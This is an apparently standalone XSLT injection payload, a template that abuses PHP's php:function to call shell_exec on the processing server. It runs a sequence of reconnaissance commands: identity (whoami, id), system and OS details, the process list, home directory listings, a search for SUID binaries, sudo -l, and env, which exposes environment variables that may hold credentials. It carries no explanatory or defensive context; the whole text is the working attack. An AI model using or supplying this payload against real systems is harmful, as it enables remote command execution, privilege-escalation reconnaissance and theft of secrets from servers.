<xsl:template match="*">
  <html><body><pre>
    <xsl:value-of select="php:function('shell_exec', 'whoami')" /><br/>
    <xsl:value-of select="php:function('shell_exec', 'id')" /><br/>
    <xsl:value-of select="php:function('shell_exec', 'uname -a')" /><br/>
    <xsl:value-of select="php:function('shell_exec', 'cat /etc/os-release')" /><br/>
    <xsl:value-of select="php:function('shell_exec', 'ps aux')" /><br/>
    <xsl:value-of select="php:function('shell_exec', 'ls -la /home')" /><br/>
    <xsl:value-of select="php:function('shell_exec', 'find / -perm -4000 -type f 2>/dev/null')" /><br/>
    <xsl:value-of select="php:function('shell_exec', 'sudo -l 2>/dev/null')" /><br/>
    <xsl:value-of select="php:function('shell_exec', 'env')" /><br/>
  </pre></body></html>
</xsl:template>
